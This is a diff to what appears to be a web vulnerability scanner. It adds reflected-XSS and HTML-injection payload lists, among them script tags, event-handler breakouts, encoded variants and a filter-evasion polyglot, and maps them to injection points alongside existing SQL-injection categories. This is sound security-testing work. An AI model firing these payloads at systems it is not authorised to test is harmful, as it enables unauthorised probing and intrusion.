@@ -113,6 +113,45 @@ TECHNIQUE_CATEGORIES: dict[str, dict[str, Any]] = {
             "template": [],
         },
     },
+    "xss_reflected": {
+        "description": "Reflected XSS payloads designed to execute or be visibly unescaped in HTML context",
+        "variants": {
+            "html_context": [
+                "<script>alert(1)</script>",
+                "<img src=x onerror=alert(1)>",
+                "<svg onload=alert(1)>",
+                "<body onload=alert(1)>",
+            ],
+            "attribute_breakout": [
+                '"><script>alert(1)</script>',
+                "' onmouseover='alert(1)",
+                '" autofocus onfocus=alert(1) x="',
+            ],
+            "javascript_uri": [
+                "javascript:alert(1)",
+                "javascript:alert(document.domain)",
+            ],
+            "encoded": [
+                "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+                "&#60;script&#62;alert(1)&#60;/script&#62;",
+                "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",  # JSON unicode escape
+            ],
+            "polyglot": [
+                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+            ],
+        },
+    },
+    "html_injection": {
+        "description": "Non-scripting markup injection — detects missing output encoding",
+        "variants": {
+            "structural": [
+                "<h1>INJECTED</h1>",
+                '<img src="x">',
+                "<hr>",
+                "<iframe src=about:blank></iframe>",
+            ],
+        },
+    },
 }
 
 # Map technique category to parameter locations where it's most effective
@@ -123,6 +162,8 @@ CATEGORY_TARGET_LOCATIONS: dict[str, list[str]] = {
     "time_based_blind": ["body_json", "query", "body_form", "header"],
     "union_based": ["body_json", "query"],
     "stacked_query": ["body_json", "query"],
+    "xss_reflected": ["body_json", "query", "body_form", "header", "cookie"],
+    "html_injection": ["body_json", "query", "body_form", "header", "cookie"],
 }
 
 # Categories that are most relevant for auth-endpoint credential fields
